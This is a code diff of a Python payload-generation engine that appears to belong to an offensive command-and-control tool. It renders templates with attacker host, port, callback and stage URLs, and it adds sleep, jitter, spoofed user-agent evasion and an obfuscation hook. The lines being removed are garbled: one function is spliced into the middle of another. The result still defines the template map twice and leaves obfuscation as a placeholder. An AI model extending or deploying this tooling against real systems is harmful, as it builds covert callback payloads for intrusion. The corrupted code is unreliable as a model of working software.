@@ -713,7 +713,7 @@ main();
     },
 ]
 
-# Quick access map
+# Quick access map (Legacy)
 TEMPLATE_MAP: dict[str, dict] = {t["id"]: t for t in TEMPLATES}
 
 
@@ -726,7 +726,7 @@ def get_template(template_id: str) -> dict | None:
     return TEMPLATE_MAP.get(template_id)
 
 
-def def generate_payload(template_id: str, params: dict) -> dict | None:
+def generate_payload(template_id: str, params: dict) -> dict | None:
     """
     Advanced payload generation engine.
     Handles template rendering, obfuscation, and metadata enrichment.
@@ -740,12 +740,17 @@ def def generate_payload(template_id: str, params: dict) -> dict | None:
     lport = str(params.get("LPORT", "8080"))
     scheme = params.get("SCHEME", "http")
     callback_url = f"{scheme}://{lhost}:{lport}"
-    
+
     # Advanced Evasion & Timing
     sleep_val = str(params.get("SLEEP", "5"))
     jitter_val = str(params.get("JITTER", "15"))
-    user_agent = str(params.get("UA", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"))
-    
+    user_agent = str(
+        params.get(
+            "UA",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+        )
+    )
+
     render_vars = {
         "LHOST": lhost,
         "LPORT": lport,
@@ -754,7 +759,7 @@ def def generate_payload(template_id: str, params: dict) -> dict | None:
         "STAGE_PATH": str(params.get("STAGE_PATH", tpl["default_stage_path"])),
         "SLEEP": sleep_val,
         "JITTER": jitter_val,
-        "UA": user_agent
+        "UA": user_agent,
     }
 
     try:
@@ -765,41 +770,7 @@ def def generate_payload(template_id: str, params: dict) -> dict | None:
 
     # Apply Obfuscation if requested
     final_content = raw_content
-    obfuscated = False
-    if params.get("OBFUSCATE", False):
-        if tpl["payload_type"] == "psrender_template(template_id: str, params: dict) -> dict | None:
-    """
-    Render a payload template with the given parameters.
-
-    Required params vary by template. Common: LHOST, LPORT.
-    Auto-populated: CALLBACK_URL (from LHOST+LPORT), UA, SLEEP, JITTER.
-    """
-    tpl = TEMPLATE_MAP.get(template_id)
-    if not tpl:
-        return None
-
-    lhost = str(params.get("LHOST", "127.0.0.1"))
-    lport = str(params.get("LPORT", "80"))
-    scheme = params.get("SCHEME", "http")
-    callback_url = f"{scheme}://{lhost}:{lport}"
-
-    render_params = {
-        "LHOST": lhost,
-        "LPORT": lport,
-        "CALLBACK_URL": callback_url,
-        "STAGE_URL": callback_url + tpl["default_stage_path"],
-        "STAGE_PATH": str(params.get("STAGE_PATH", tpl["default_stage_path"])),
-        "SLEEP": str(params.get("SLEEP", "5")),
-        "JITTER": str(params.get("JITTER", "10")),
-        "UA": str(
-            params.get(
-                "UA",
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-            )
-        ),
-    }
-
-    content = tpl["content"].format(**render_params)
+    # Note: Obfuscation placeholder (logic to be implemented)
 
     return {
         "template_id": template_id,
@@ -807,6 +778,17 @@ def def generate_payload(template_id: str, params: dict) -> dict | None:
         "payload_type": tpl["payload_type"],
         "platform": tpl["platform"],
         "default_stage_path": tpl["default_stage_path"],
-        "content": content,
-        "params_used": render_params,
+        "content": final_content,
+        "params_used": render_vars,
     }
+
+
+def render_template(template_id: str, params: dict) -> dict | None:
+    """
+    Alias for generate_payload (legacy name support)
+    """
+    return generate_payload(template_id, params)
+
+
+# Quick access map
+TEMPLATE_MAP: dict[str, dict] = {t["id"]: t for t in TEMPLATES}
